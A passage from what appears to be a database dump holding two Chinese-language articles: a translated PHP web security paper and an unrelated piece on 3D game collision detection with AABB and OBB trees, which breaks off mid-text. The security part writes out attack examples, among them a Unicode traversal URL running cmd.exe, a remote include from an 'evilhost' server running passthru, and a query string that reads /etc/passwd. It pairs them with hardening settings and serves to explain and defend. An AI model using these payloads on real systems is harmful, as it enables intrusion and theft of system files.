/>\r\n?&gt;</p>\r\n\r\n<p>上面的脚本试图打开文件&ldquo;$filename&rdquo;，如果失败就显示错误信息。很明显，如果我们能够指定&ldquo;$filename&rdquo;的话，就能利用这个脚本浏览系统中的任何文件。但是，这个脚本还存在一个不太明显的特性，那就是它可以从任何其它WEB或FTP站点读取文件。实际上，PHP的大多数文件处理函数对远程文件的处理是透明的。</p>\r\n\r\n<p>例如：<br />\r\n如果指定&ldquo;$filename&rdquo;为&ldquo;http://target/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir&rdquo;<br />\r\n则上面的代码实际上是利用主机target上的unicode漏洞，执行了dir命令。</p>\r\n\r\n<p>这使得支持远程文件的include()，require()，include_once()和require_once()在上下文环境中变得更有趣。这些函数主要功能是包含指定文件的内容，并且把它们按照PHP代码解释，主要是用在库文件上。</p>\r\n\r\n<p>例如：<br />\r\n&lt;?php<br />\r\ninclude($libdir . &quot;/languages.php&quot;);<br />\r\n?&gt;</p>\r\n\r\n<p>上例中&ldquo;$libdir&rdquo;一般是一个在执行代码前已经设置好的路径，如果攻击者能够使得&ldquo;$libdir&rdquo;没有被设置的话，那么他就可以改变这个路径。但是攻击者并不能做任何事情，因为他们只能在他们指定的路径中访问文件languages.php（perl中的&ldquo;Poison null byte&rdquo;攻击对PHP没有作用）。但是由于有了对远程文件的支持，攻击者就可以做任何事情。例如，攻击者可以在某台服务器上放一个文件languages.php，包含如下内容：</p>\r\n\r\n<p>&lt;?php<br />\r\npassthru(&quot;/bin/ls /etc&quot;);<br />\r\n?&gt;</p>\r\n\r\n<p>然后把&ldquo;$libdir&rdquo;设置为&ldquo;http://&lt;evilhost&gt;/&rdquo;，这样我们就可以在目标主机上执行上面的攻击代码，&ldquo;/etc&rdquo;目录的内容作为结果返回到客户的浏览器中。</p>\r\n\r\n<p>需要注意的是，攻击服务器（也就是evilhost）应该不能执行PHP代码，否则攻击代码会在攻击服务器，而不是目标服务器执行，如果你想了解具体的技术细节，请参考：http://www.securereality.com.au/sradv00006.txt</p>\r\n\r\n<p>[文件上载]<br />\r\nPHP自动支持基于RFC 1867的文件上载，我们看下面的例子：</p>\r\n\r\n<p>&lt;FORM METHOD=&quot;POST&quot; ENCTYPE=&quot;multipart/form-data&quot;&gt;<br />\r\n&lt;INPUT TYPE=&quot;FILE&quot; NAME=&quot;hello&quot;&gt;<br />\r\n&lt;INPUT TYPE=&quot;HIDDEN&quot; NAME=&quot;MAX_FILE_SIZE&quot; VALUE=&quot;10240&quot;&gt;<br />\r\n&lt;INPUT TYPE=&quot;SUBMIT&quot;&gt;<br />\r\n&lt;/FORM&gt;</p>\r\n\r\n<p>上面的代码让用户从本地机器选择一个文件，当点击提交后，文件就会被上载到服务器。这显然是很有用的功能，但是PHP的响应方式使这项功能变的不安全。当PHP第一次接到这种请求，甚至在它开始解析被调用的PHP代码之前，它会先接受远程用户的文件，检查文件的长度是否超过&ldquo;$MAX_FILE_SIZE variable&rdquo;定义的值，如果通过这些测试的话，文件就会被存在本地的一个临时目录中。</p>\r\n\r\n<p>因此，攻击者可以发送任意文件给运行PHP的主机，在PHP程序还没有决定是否接受文件上载时，文件已经被存在服务器上了。</p>\r\n\r\n<p>这里我就不讨论利用文件上载来对服务器进行DOS攻击的可能性了。</p>\r\n\r\n<p>让我们考虑一下处理文件上载的PHP程序，正如我们上面说的，文件被接收并且存在服务器上（位置是在配置文件中指定的，一般是/tmp），扩展名一般是随机的，类似&ldquo;phpxXuoXG&rdquo;的形式。PHP程序需要上载文件的信息以便处理它，这可以通过两种方式，一种方式是在PHP 3中已经使用的，另一种是在我们对以前的方法提出安全公告后引入的。</p>\r\n\r\n<p>但是，我们可以肯定的说，问题还是存在的，大多数PHP程序还是使用老的方式来处理上载文件。PHP设置了四个全局变量来描述上载文件，比如说上面的例子：</p>\r\n\r\n<p>$hello = Filename on local machine (e.g &quot;/tmp/phpxXuoXG&quot;)<br />\r\n$hello_size = Size in bytes of file (e.g 1024)<br />\r\n$hello_name = The original name of the file on the remote system (e.g &quot;c:\\\\temp\\\\hello.txt&quot;)<br />\r\n$hello_type = Mime type of uploaded file (e.g &quot;text/plain&quot;)</p>\r\n\r\n<p>然后PHP程序开始处理根据&ldquo;$hello&rdquo;指定的文件，问题在于&ldquo;$hello&rdquo;不一定是一个PHP设置的变量，任何远程用户都可以指定它。如果我们使用下面的方式：</p>\r\n\r\n<p>http://vulnhost/vuln.php?hello=/etc/passwd&amp;hello_size=10240&amp;hello_type=text/plain&amp;hello_name=hello.txt</p>\r\n\r\n<p>就导致了下面的PHP全局变量（当然POST方式也可以（甚至是Cookie））：</p>\r\n\r\n<p>$hello = &quot;/etc/passwd&quot;<br />\r\n$hello_size = 10240<br />\r\n$hello_type = &quot;text/plain&quot;<br />\r\n$hello_name = &quot;hello.txt&quot;</p>\r\n\r\n<p>上面的表单数据正好满足了PHP程序所期望的变量，但是这时PHP程序不再处理上载的文件，而是处理&ldquo;/etc/passwd&rdquo;（通常会导致内容暴露）。这种攻击可以用于暴露任何敏感文件的内容。</p>\r\n\r\n<p>我在前面已经说了，新版本的PHP使用HTTP_POST_FILES[]来决定上载文件，同时也提供了很多函数来解决这个问题，例如有一个函数用来判断某个文件是不是实际上载的文件。这些函数很好的解决了这个问题，但是实际上肯定有很多PHP程序仍然使用旧的方法，很容易受到这种攻击。</p>\r\n\r\n<p>作为文件上载的攻击方法的一个变种，我们看一下下面的一段代码：</p>\r\n\r\n<p>&lt;?php<br />\r\nif (file_exists($theme)) // Checks the file exists on the local system (no remote files)<br />\r\ninclude(&quot;$theme&quot;);<br />\r\n?&gt;</p>\r\n\r\n<p>如果攻击者可以控制&ldquo;$theme&rdquo;的话，很显然它可以利用&ldquo;$theme&rdquo;来读取远程系统上的任何文件。攻击者的最终目标是在远程服务器上执行任意指令，但是他无法使用远程文件，因此，他必须得在远程服务器上创建一个PHP文件。这乍看起来好象是不可能的，但是文件上载帮了我们这个忙，如果攻击者先在本地机器上创建一个包含PHP代码的文件，然后创建一个包含名为&ldquo;theme&rdquo;的文件域的表单，最后用这个表单通过文件上载把创建的包含PHP代码的文件提交给上面的代码，PHP就会把攻击者提交的文件保存起来，并把&ldquo;$theme&rdquo;的值设置为攻击者提交的文件，这样file_exists()函数会检查通过，攻击者的代码也将执行。</p>\r\n\r\n<p>获得执行任意指令的能力之后，攻击者显然想提升权限或者是扩大战果，而这又需要一些服务器上没有的工具集，而文件上载又一次帮了我们这个忙。攻击者可以使用文件上载功能上载工具，把她们存在服务器上，然后利用他们执行指令的能力，使用chmod()改变文件的权限，然后执行。例如：攻击者可以绕过防火墙或IDS上载一个本地root攻击程序，然后执行，这样就获得了root权限。</p>\r\n\r\n<p>[库文件]<br />\r\n正如我们前面讨论的那样，include()和require()主要是为了支持代码库，因为我们一般是把一些经常使用的函数放到一个独立的文件中，这个独立的文件就是代码库，当需要使用其中的函数时，我们只要把这个代码库包含到当前的文件中就可以了。</p>\r\n\r\n<p>最初，人们开发和发布PHP程序的时候，为了区别代码库和主程序代码，一般是为代码库文件设置一个&ldquo;.inc&rdquo;的扩展名，但是他们很快发现这是一个错误，因为这样的文件无法被PHP解释器正确解析为PHP代码。如果我们直接请求服务器上的这种文件时，我们就会得到该文件的源代码，这是因为当把PHP作为Apache的模块使用时，PHP解释器是根据文件的扩展名来决定是否解析为PHP代码的。扩展名是站点管理员指定的，一般是&ldquo;.php&rdquo;， &ldquo;.php3&rdquo;和&ldquo;.php4&rdquo;。如果重要的配置数据被包含在没有合适的扩展名的PHP文件中，那么远程攻击者很容易得到这些信息。</p>\r\n\r\n<p>最简单的解决方法就是给每个文件都指定一个PHP文件的扩展名，这样可以很好的防止泄露源代码的问题，但是又产生了新的问题，通过请求这个文件，攻击者可能使本该在上下文环境中运行的代码独立运行，这可能导致前面讨论的全部攻击。</p>\r\n\r\n<p>下面是一个很明显的例子：</p>\r\n\r\n<p>In main.php:<br />\r\n&lt;?php<br />\r\n$libDir = &quot;/libdir&quot;;<br />\r\n$langDir = &quot;$libdir/languages&quot;;</p>\r\n\r\n<p>...</p>\r\n\r\n<p>include(&quot;$libdir/loadlanguage.php&quot;:<br />\r\n?&gt;</p>\r\n\r\n<p>In libdir/loadlanguage.php:<br />\r\n&lt;?php<br />\r\n...</p>\r\n\r\n<p>include(&quot;$langDir/$userLang&quot;);<br />\r\n?&gt;</p>\r\n\r\n<p>当&ldquo;libdir/loadlanguage.php&rdquo;被&ldquo;main.php&rdquo;调用时是相当安全的，但是因为&ldquo;libdir/loadlanguage&rdquo;具有&ldquo;.php&rdquo;的扩展名，因此远程攻击者可以直接请求这个文件，并且可以任意指定&ldquo;$langDir&rdquo;和&ldquo;$userLang&rdquo;的值。</p>\r\n\r\n<p><br />\r\n[Session文件]<br />\r\nPHP 4或更新的版本提供了对sessions的支持，它的主要作用是在PHP程序中保存页与页之间的状态信息。例如，当一个用户登陆进入网站，他登陆了这个事实以及谁登陆进入这个网站都被保存在session中，当他在网站中到处浏览时，所有的PHP代码都可以获得这些状态信息。</p>\r\n\r\n<p>事实上，当一个session启动时（实际上是在配置文件中设置为在第一次请求时自动启动），就会生成一个随机的&ldquo;session id&rdquo;，如果远程浏览器总是在发送请求时提交这个&ldquo;session id&rdquo;的话，session就会一直保持。这通过Cookie很容易实现，也可以通过在每页提交一个表单变量（包含&ldquo;session id&rdquo;）来实现。PHP程序可以用session注册一个特殊的变量，它的值会在每个PHP脚本结束后存在session文件中，也会在每个PHP脚本开始前加载到变量中。下面是一个简单的例子：</p>\r\n\r\n<p>&lt;?php<br />\r\nsession_destroy(); // Kill any data currently in the session<br />\r\n$session_auth = &quot;shaun&quot;;<br />\r\nsession_register(&quot;session_auth&quot;); // Register $session_auth as a session variable<br />\r\n?&gt;</p>\r\n\r\n<p>新版本的PHP都会自动把&ldquo;$session_auth&rdquo;的值设置为&ldquo;shaun&rdquo;，如果它们被修改的话，以后的脚本都会自动接受修改后的值，这对无状态的Web来说的确是种很不错的工具，但是我们也应该小心。</p>\r\n\r\n<p>一个很明显的问题就是确保变量的确来自session，例如，给定上面的代码，如果后续的脚本是下面这样的话：</p>\r\n\r\n<p>&lt;?php<br />\r\nif (!empty($session_auth))<br />\r\n&nbsp;&nbsp; // Grant access to site here<br />\r\n?&gt;</p>\r\n\r\n<p>上面的代码假定如果&ldquo;$session_auth&rdquo;被置位的话，就是从session，而不是从用户输入来置位的，如果攻击者通过表单输入来置位的话，他就可以获得对站点的访问权。注意攻击者必须在session注册该变量之前使用这种攻击方法，一旦变量被放进了session，就会覆盖任何表单输入。</p>\r\n\r\n<p>Session数据一般是保存在文件中（位置是可配置的，一般是&ldquo;/tmp&rdquo;），文件名一般是类似&ldquo;sess_&lt;session id&gt;&rdquo;的形式，这个文件包含变量名称，变量类型，变量值和一些其它的数据。在多主机系统中，因为文件是以运行Web服务器的用户身份（一般是nobody）保存的，因此恶意的站点拥有者就可以通过创建一个session文件来获得对其它站点的访问，甚至可以检查session文件中的敏感信息。</p>\r\n\r\n<p>Session机制也为攻击者把自己的输入保存在远程系统的文件中提供了另一个方便的地方，对于上面的例子来说，攻击者需要在远程系统放置一个包含PHP代码的文件，如果不能利用文件上载做到的话，他通常会利用session为一个变量按照自己的意愿赋一个值，然后猜测session文件的位置，而他知道文件名是&ldquo;php&lt;session id&gt;&rdquo;，所以只需猜测目录，而目录一般就是&ldquo;/tmp&rdquo;。</p>\r\n\r\n<p>另外，攻击者可以任意指定&ldquo;session id&rdquo;（例如&ldquo;hello&rdquo;），然后用这个&ldquo;session id&rdquo;创建一个session文件（例如&ldquo;/tmp/sess_hello&rdquo;），但是&ldquo;session id&rdquo;只能是字母和数字组合。</p>\r\n\r\n<p>[数据类型]<br />\r\nPHP具有比较松散的数据类型，变量的类型依赖于它们所处的上下文环境。例如：&ldquo;$hello&rdquo;开始是字符串变量，值为&ldquo;&rdquo;，但是在求值时，就变成了整形变量&ldquo;0&rdquo;，这有时可能会导致一些意想不到的结果。如果&ldquo;$hello&rdquo;的值为&ldquo;000&rdquo;还是为&ldquo;0&rdquo;是不同的，empty()返回的结果也不会为真。</p>\r\n\r\n<p>PHP中的数组是关联数组，也就是说，数组的索引是字符串型的。这意味着&ldquo;$hello[&quot;000&quot;]&rdquo;和&ldquo;$hello[0]&rdquo;也是不同的。</p>\r\n\r\n<p>开发程序的时候应该仔细地考虑上面的问题，例如，我们不应该在一个地方测试某个变量是否为&ldquo;0&rdquo;，而在另外的地方使用empty()来验证。</p>\r\n\r\n<p>[容易出错的函数]<br />\r\n我们在分析PHP程序中的漏洞时，如果能够拿到源代码的话，那么一份容易出错的函数列表则是我们非常需要的。如果我们能够远程改变这些函数的参数的话，那么我们就很可能发现其中的漏洞。下面是一份比较详细的容易出错的函数列表：</p>\r\n\r\n<p>&lt;PHP代码执行&gt;<br />\r\nrequire()：读取指定文件的内容并且作为PHP代码解释<br />\r\ninclude()：同上<br />\r\neval()：把给定的字符串作为PHP代码执行<br />\r\npreg_replace()：当与&ldquo;/e&rdquo;开关一起使用时，替换字符串将被解释为PHP代码</p>\r\n\r\n<p>&lt;命令执行&gt;<br />\r\nexec()：执行指定的命令，返回执行结果的最后一行<br />\r\npassthru()：执行指定命令，返回所有结果到客户浏览器<br />\r\n``：执行指定命令，返回所有结果到一个数组<br />\r\nsystem()：同passthru()，但是不处理二进制数据<br />\r\npopen()：执行指定的命令，把输入或输出连接到PHP文件描述符</p>\r\n\r\n<p>&lt;文件泄露&gt;<br />\r\nfopen()：打开文件，并对应一个PHP文件描述符<br />\r\nreadfile()：读取文件的内容，然后输出到客户浏览器<br />\r\nfile()：把整个文件内容读到一个数组中</p>\r\n\r\n<p>译者注：其实这份列表还不是很全，比如&ldquo;mail()&rdquo;等命令也可能执行命令，所以需要自己补充一下。<br />\r\n[如何增强PHP的安全性]<br />\r\n我在上面介绍的所有攻击对于缺省安装的PHP 4都可以很好的实现，但是我已经重复了很多次，PHP的配置非常灵活，通过配置一些PHP选项，我们完全可能抵抗其中的一些攻击。下面我按照实现的难度对一些配置进行了分类：</p>\r\n\r\n<p>*低难度<br />\r\n**中低难度<br />\r\n***中高难度<br />\r\n****高难度</p>\r\n\r\n<p>上面的分类只是个人的看法，但是我可以保证，如果你使用了PHP提供的所有选项的话，那么你的PHP将是很安全的，即使是第三方的代码也是如此，因为其中很多功能已经不能使用。</p>\r\n\r\n<p>**** 设置&ldquo;register_globals&rdquo;为&ldquo;off&rdquo;<br />\r\n这个选项会禁止PHP为用户输入创建全局变量，也就是说，如果用户提交表单变量&ldquo;hello&rdquo;，PHP不会创建&ldquo;$ hello&rdquo;，而只会创建&ldquo;HTTP_GET/POST_VARS[&#39;hello&#39;]&rdquo;。这是PHP中一个极其重要的选项，关闭这个选项，会给编程带来很大的不便。</p>\r\n\r\n<p>*** 设置&ldquo;safe_mode&rdquo;为&ldquo;on&rdquo;<br />\r\n打开这个选项，会增加如下限制：<br />\r\n1．&nbsp;&nbsp;&nbsp; 限制哪个命令可以被执行<br />\r\n2．&nbsp;&nbsp;&nbsp; 限制哪个函数可以被使用<br />\r\n3．&nbsp;&nbsp;&nbsp; 基于脚本所有权和目标文件所有权的文件访问限制<br />\r\n4．&nbsp;&nbsp;&nbsp; 禁止文件上载功能<br />\r\n这对于ISP来说是一个伟大的选项，同时它也能极大地改进PHP的安全性。</p>\r\n\r\n<p>** 设置&ldquo;open_basedir&rdquo;<br />\r\n这个选项可以禁止指定目录之外的文件操作，有效地消除了本地文件或者是远程文件被include()的攻击，但是仍需要注意文件上载和session文件的攻击。</p>\r\n\r\n<p>** 设置&ldquo;display_errors&rdquo;为&ldquo;off&rdquo;，设置&ldquo;log_errors&rdquo;为&ldquo;on&rdquo;<br />\r\n这个选项禁止把错误信息显示在网页中，而是记录到日志文件中，这可以有效的抵制攻击者对目标脚本中函数的探测。</p>\r\n\r\n<p>* 设置&ldquo;allow_url_fopen&rdquo;为&ldquo;off&rdquo;<br />\r\n这个选项可以禁止远程文件功能，极力推荐！</p>\r\n',0,1438092034,0,0),(110,31,'高级碰撞检测技术','<p>自从计算机游戏出现以来，程序员就不断地想办法来更精确地模拟现实世界。就拿乒乓游戏为例子（译者：Pong&mdash;被誉为电子游戏的祖先，有幸见过一次：），能见到祖先做的游戏感觉真是爽啊，想看的可以到FTP上下载&ldquo;地球故事&rdquo;就可以看到了：），游戏中有一个象征性的小方块（球）和两支拍子，游戏者需要在恰当的时间将拍子移动到恰当的地点，将小球反弹回去。这个基本操作的背后（以现在的标准来看）就是最原初的碰撞检测了。今天的游戏比&ldquo;乒乓&rdquo;要高级得多，并且基本上是基于3D的。3D游戏中的碰撞检测比&ldquo;乒乓&rdquo;游戏里的要更加难实现。玩一些早期模拟飞行游戏的体验向我们展现出糟糕的碰撞检测是如何毁灭一个游戏的。当穿过一座大山的尖顶的时候仍然活着，感觉很不真实。即便是现在的一些游戏也还是有碰撞上的问题，许多玩家曾经失望地看着他们喜爱的英雄或女英雄的部分身体穿进了墙里。甚至更糟的是，许多玩家都有过这样糟糕的体验，就是被那些离得很远的子弹或火箭击中。因为游戏者们要求提升真实性，我们开发者就不得不绞尽脑汁想办法让我们的游戏世界尽可能地接近现实世界。</p>\r\n\r\n<p>阅读这篇文章前首先假设你对与碰撞检测相关的几何和数学知识已经有了基本的了解。在文章的最后，我将提供一些这方面的参考资料，以免你对它们感觉有点生疏。另外我还假设你已经读过 Jeff Lander 的图形专栏里关于碰撞检测文章（&ldquo;Crashing into the New Year,&rdquo; ; &ldquo;When Two Hearts Collide,&rdquo;;和 &ldquo;Collision Response: Bouncy, Trouncy, Fun,&rdquo;）。我将首先进行一个大概的描述，然后快速地切入到核心内容里，通过这两步从上至下地深入到碰撞检测中。我将讨论两种类型的图形引擎中的碰撞检测：基于 portal 的和基于 BSP 的。每种引擎中多边形的组织各不相同，因此在 world-object 型的碰撞检测上存在很大的差别。而object-object 型的碰撞检测绝大多数地方在上述两种引擎里的是一样的，主要看你是如何实现的了。当我们接触到多边形的碰撞检测时，我们还会实验如何将其扩展到我们学过的凸型物体上。</p>\r\n\r\n<p><br />\r\n预览</p>\r\n\r\n<p>为了创建一个理想的碰撞检测程序，我们不得不在开发一个游戏的的图形管道的同时就开始计划并创建它的框架。在项目的最后加入碰撞检测是相当困难的。想在开发周期的末尾创建快速的碰撞检测将很有可能会使整个游戏被毁掉，因为我们不可能使它能高效地运行。在好的游戏引擎中，碰撞检测应该是精确、有效并且十分快速的。这些要求意味着碰撞检测将要与场景的多边形管理管道紧紧地联系起来。这也意味着穷举法将无法工作――今天的3D游戏中每帧处理的数据量很可能导致打格，当你还在检测一个物体的各多边形是否与场景中的其它多边形碰撞时，时间已经过去了。</p>\r\n\r\n<p>让我们从基本的游戏引擎循环开始吧（列表1）。快速浏览这些代码来得到碰撞检测的相关策略。我们先假设碰撞没有发生，然后更新物体的位置，如果发现发生了碰撞，我们将把物体移回原来的位置不允许它穿越边界（或将物体销毁或执行一些预防措施）。然而，这个假设太过简单因为我们无法得知物体原来的位置是否仍然有效。你必须为这种情况设计一个方案（否则你可能会体验到坠机或被子弹击中的感觉――就是前面举的例子）。如果你是一个热心的玩家，你可能已经注意到了在一些游戏当中，当你挨着墙壁并试图穿过去的时候，摄像机就开始震动。你正经历的就是将主角移回原位的情况。震动是因为取了较大的时间片引起的。</p>\r\n\r\n<p>Listing 1. Extremely Simplified Game Loop<br />\r\nwhile(1){<br />\r\n&nbsp;&nbsp;&nbsp; process_input();<br />\r\n&nbsp;&nbsp;&nbsp; update_objects();<br />\r\n&nbsp;&nbsp;&nbsp; render_world();<br />\r\n}<br />\r\nupdate_objects(){<br />\r\n&nbsp;&nbsp;&nbsp; for (each_object)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; save_old_position();<br />\r\n&nbsp;&nbsp;&nbsp; calc new_object_position<br />\r\n{based on velocity accel. etc.}<br />\r\nif (collide_with_other_objects())<br />\r\n&nbsp;&nbsp;&nbsp; new_object_position = old_position();<br />\r\n{or if destroyed object remove it etc.}</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150728220713979428.gif\" style=\"height:190px; width:200px\" /></p>\r\n\r\n<p>Figure 1. Time gradient and collision tests.</p>\r\n\r\n<p>但是我们的方法有缺陷，我们忘了在等式中加入时间。图1告诉我们时间太重要了不能忘了它。即便物体在 t1 或 t2 时刻没有发生碰撞，它仍有可能在 t 时刻穿过边界（t1&lt;t&lt;t2）。这会在两个连续帧中产生大幅度地跨越（就好象击中了燃料室或其它类似的东西）。我们不得不找一个好的方法来解决这个问题。</p>\r\n\r\n<p>我们可以把时间看成是第四维并将所有运算在4维空间中进行。然而这可能会让运算变得十分复杂，所以我们会避开这些。我们还可以创建一个以 t1、t2时刻的物体为起始点的实心体，然后用它来与墙进行测试（见图2）</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150728220740372570.gif\" style=\"height:190px; width:200px\" /></p>\r\n\r\n<p>Figure 2. Solid created from the space that an object spans over a given time frame.</p>\r\n\r\n<p>一个简单的方法就是创建一个凸壳来罩住两个不同时刻的物体。这种方法效率低下可能会明显地降低你的游戏速度。以其创建一个凸壳，还不如创建一个围绕实心体的包围盒。我们学习其它的技术后再回来讨论这个问题。</p>\r\n\r\n<p>有另一种比较容易执行但精度较低的方法，就是把给定的时间段分为两分，然后测试时间中点的相交关系。我们还可以递归地依次测定各段的时间中点。这个方法比先前的方法要快得多，但不能保证能捕捉到所有的碰撞情况。</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150728220809920953.gif\" style=\"height:50px; width:41px\" /></p>\r\n\r\n<p>另一个暗藏着的问题是collide_with_other_objects()方法的实现――即判断一个物体是否与场景中的其它物体相交。如果场景中有很多的物体，这个方法可能消耗很大。如果要判断各物体与场景中其它物体是否相交，我们将不得不进行大概N选2次比较。因此比较次数会是N的平方次冪（或表示成O(N2)）。但我们可以用几种方法来避免进行O(N2)对的比较。举个例子，我们可以把场景中的物体分成静态的（被撞物）和动态的（碰撞物――即使它的速度为0也行）。就好象房间中的墙壁是被撞物，而一个扔向墙壁的小球是碰撞物。我们可以创建两棵独立的树（每一棵对应一类物体），然后测试那些物体可能会碰撞的树。我们甚至可以对环境进行约定让一些碰撞物之间不发生碰撞――比如我们不需要在两颗子弹之间进行判断。现在在继续之前，（经过改进之后）我们可以说处理过程变得更加清晰了。（另一个减少场景中成对的比较的方法就是建立八叉树。这已经超出了这篇文章的范围，你可以在Spatial Data Structures: Quadtree, Octrees and Other Hierarchical Methods文章中的For Further Info一节里读到更多关于八叉的信息）。现在让我们来看一下基于 Portal 引擎，了解为什么在这类引擎中一提到碰撞检测就会那么痛苦。</p>\r\n\r\n<p><br />\r\nPortal引擎和Object-Object型碰撞</p>\r\n\r\n<p>基于 Portal 的引擎把场景或世界分割成较小的凸方形区域。凸方形区域很适合图形管道因为它们能避免重绘现象。不幸的是，对碰撞检测来说，凸方形区域会给我们带来一些困难。在我最近的一些测试中，一个引擎中平均大约有400到500个凸方形区域。当然，这个数字会随着不同的引擎而有所变化，因为不同的引擎使用不同的多边形技术。而且多边形的数目也会因场景的大小而有所不同。</p>\r\n\r\n<p>判断一个物体的多边形是否穿过了场景中的多边形产生的运算量可能会很大。一个最简单的碰撞检测法就是用球形来近似地表示物体或物体的一部分，然后再判断这些包围球是否相交。这样我们仅仅需要测试两个球体中心的距离是否小于它们的半径合（这表示发生了碰撞）。如果我们是用中心点距离的平方和半径合的平方进行比较，那更好，这样我们可以在计算距离时除去拙劣的开方运算。但是，简单的运算也导致了精确度的降低（见图3）。</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150728220836126559.gif\" style=\"height:152px; width:200px\" /></p>\r\n\r\n<p>Figure 3. In a sphere-sphere intersection, the routine may report that collision has occurred when it really hasn&rsquo;t.</p>\r\n\r\n<p>但我们仅仅是将这个不太精确的方法做为我们的第一步。我们用一个大的球体代表整个对象，然后检测它是否和其它的球体相交。如果检测到发生了碰撞，那么我们就要进一步提高精度，我们可以将大的球体分割成一系列小的球体，并检查与各小球体是否发生碰撞。我们不断地分割检查直到得到满意的近似值为止。分层并分割的基本思想就是我们要尽可能达到适合需要的理想的情况。</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150728220911305197.gif\" style=\"height:176px; width:320px\" /></p>\r\n\r\n<p>Figure 4. Sphere subdivision.</p>\r\n\r\n<p>用球体去近似地代表物体运算量很小，但在游戏中的大多数物体是方的，我们应该用方盒来代表物体。开发者一直用包围盒和这种递归的快速方法来加速光线追踪算法。在实际中，这些算法已经以八叉和AABB（axis-aligned bounding boxes）的方式出现了。图5展示了一个AABB和它里面的物体。</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150728220935390066.gif\" style=\"height:200px; width:328px\" /></p>\r\n\r\n<p>Figure 5. An object and its AABB.</p>\r\n\r\n<p>坐标轴平行（&ldquo;Axis-aligned&rdquo;）不仅指盒体与世界坐标轴平行，同时也指盒体的每个面都和一条坐标轴垂直。这样一个基本信息就能减少转换盒体时操作的次数。AABBs 在当今的许多游戏中都得到了应用，开发者经常用它们作为模型的包围盒。再次指出，提高精度的同时也会降低速度。因为 AABBs 总是与坐标思平行，我们不能在旋转物体的时候简单地旋转 AABBs --- 它们应该在每一帧都重新计算过。如果我们知道每个对象的内容，这个计算就不算困难并不会降低游戏的速度。 然而，我们还面临着精度的问题。假如我们有一个3D的细长刚性直棒，并且要在每一帧动画中都重建它的AABB。我们可以看到每一帧中的包围盒的都不一样而且精度也会随之改变。</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150728221019501550.gif\" style=\"height:150px; width:320px\" /></p>\r\n\r\n<p>Figure 6. Successive AABBs for a spinning<br />\r\nrod (as viewed from the side).</p>\r\n\r\n<p>所以以其用 AABBs，为什么我们不用任意方向能最小化空白区域的包围盒呢。这是一种基于叫 oriented bounding boxes&mdash;OBBs 的技术，它已经广泛用于光线追踪和碰撞检测中。这种技术不但比 AABBs 技术更精确而且还更健壮。但 OBBs 实现起来比较困难，执行速度慢，并且不太适合动态的或柔性的物体。特别注意的是当我们把一个物体分得越来越小的时候，我们事实上在创建一棵有层次的树。</p>\r\n\r\n<p>我们是选择 AABBs 还是选择 OBBs 应该根据我们所需的精确程度而定。对一个需要快速反应的3D射击游戏来说，我们可能用 AABB 来进行碰撞检测更好些――我们可以牺牲一些精度来换取速度和实现的简单化。这篇文章附带的代码已经传到 Game Developer 网页上了。里面是从 AABBs 开始讲起，同时还提供了一些实现 OBBs 的碰撞检测包里的代码例子。好了，现在我们已经有了关于每一部分是如果工作的认识了，下面我们来看看实现的细节。</p>\r\n\r\n<p><br />\r\n创建树</p>\r\n\r\n<p>为任意的网格模型创建 OBB 树可能是算法里最难的一个部分，而且它还要调整以适合特定的引擎或游戏类型。图7示出了从最初的模型创建一个OBB树的整个过程。可以看到，我们不得不找出包围给定模型的最近似的包围盒（或者其它3D体）。</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150728221046933450.gif\" style=\"height:150px; width:409px\" /></p>\r\n\r\n<p>Figure 7. Recursive build of an OBB and its tree.</p>\r\n\r\n<p>有几种方法可以事先计算OBB，这其中包括了许多的数学运算。其中一个基本的方法是计算顶点分布的均值，将它作为包围盒的中心，然后计算协方差矩阵。然后我们用协方差矩阵的三个特征向量中的两个把多边形和包围盒结合起来。我们可以凸盒方法进一步加速和优化树的创建。你可以在Gottschalk, Lin, 和 Manocha的文章中的&ldquo;For Further Info&rdquo;一节找到相关信息。建立AABB树要简单得多，因为我们不需要找出物体的最小的包围体和它们的轴。我们只需决定在哪分开模型，而且包围盒可以自由创建（只要包围盒平行于坐标轴并且包含分割面其中一侧的所有顶点）。</p>\r\n\r\n<p>现在我们得到了所有的包围盒，下一步我们来构造一棵树。我们从最初的包围盒开始从上至下地反复分割它。另外，我们还可以用从下至上的方式，逐步地合并小包围盒从而得到最大的包围盒。把大的包围盒分割成小的包围盒，我们应该遵守以下几条原则。我们应该用一个面（这个面垂直于包围盒中的一条坐标轴）来分割包围盒上最长的轴，然后根据多边形处在分割轴的哪一边把多边形分离开来（如图7）。如果不能沿着最长的轴进行分割，那我们就沿第二长的边分割。我们持续地分割直到包围盒不能再分割为止。依据我们需要的精度（比如，是否我们真的要判断单个三角形的碰撞），我们可以按我们的选择的方式（如是按树的深度或是按包围盒中多边形的数目）以任意的条件停止分割。</p>\r\n\r\n<p>正如你所看到的，创建阶段相当复杂，其中包括了大量的运算。很明显不能实时地创建树――只能是事先创建。事先创建可以免去实时改变多边形的可能。另一个缺点是OBB要求进行大量的矩阵运算，我们不得不把它们定位在适当的地方，并且每棵子树必须与矩阵相乘。</p>\r\n\r\n<p><br />\r\n使用树进行碰撞检测</p>\r\n\r\n<p>现在假设我们已经有了OBB或者AABB树。那么我们该怎么进行碰撞检测呢？我们先检测最大的包围盒是否相交，如果相交了，他们可能发生了碰撞，接下来我们将进一步地递归处理它们（不断地递归用下一级进行处理）。如果我们沿着下一级，发现子树并没有发生相交，这时我们就可以停止并得出结论没有发生碰撞。如果我们发现子树也相交了，那么要进一步处理它的子树直到到达叶子节点，并最终得出结论。进行相交测试时，我们可以把包围盒投影到空间坐标轴上并检查它们是否线性相交。这种给定的坐标轴称为分离坐标轴（separating axis）如图8所示。</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150728221111294869.gif\" style=\"height:210px; width:308px\" /></p>\r\n\r\n<p>Figure 8. Separating axis (intervals<br />\r\nA and B don&rsquo;t overlap).<br />\r\n<br />\r\n　　